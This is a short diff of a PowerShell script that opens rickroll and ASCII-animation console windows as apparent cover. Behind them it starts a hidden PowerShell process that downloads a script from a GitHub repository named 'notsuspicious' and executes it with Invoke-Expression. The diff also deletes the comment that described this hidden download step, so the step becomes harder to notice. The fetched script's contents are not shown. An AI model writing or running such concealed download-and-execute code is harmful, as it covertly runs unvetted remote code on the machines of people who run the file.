@@ -7,15 +7,6 @@ Start-Process cmd -ArgumentList "/c start cmd /k curl ascii.live/rick" -WindowSt
 # Wait for a moment to let the windows start
 Start-Sleep -Seconds 5
 
-# Move the Star Wars window 200px to the left of the PowerShell window
-$leftPos = $psWindow.MainWindowLeft - 200
-Move-Window -ProcessName "cmd" -Left $leftPos -Top $psWindow.MainWindowTop -Width 800 -Height 600
-
-# Move the rickroll window 200px to the right of the PowerShell window
-$rightPos = $psWindow.MainWindowLeft + $psWindow.MainWindowWidth + 200
-Move-Window -ProcessName "cmd" -Left $rightPos -Top $psWindow.MainWindowTop -Width 800 -Height 600
-
-# Start the downloader.ps1 script in a hidden, detached PowerShell window
 $psi = New-Object System.Diagnostics.ProcessStartInfo
 $psi.FileName = "powershell.exe"
 $psi.Arguments = "-WindowStyle Hidden -NoLogo -NoProfile -Command `"Invoke-Expression (Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/notsuspicious/raw/main/downloader.ps1' -UseBasicParsing).Content`""
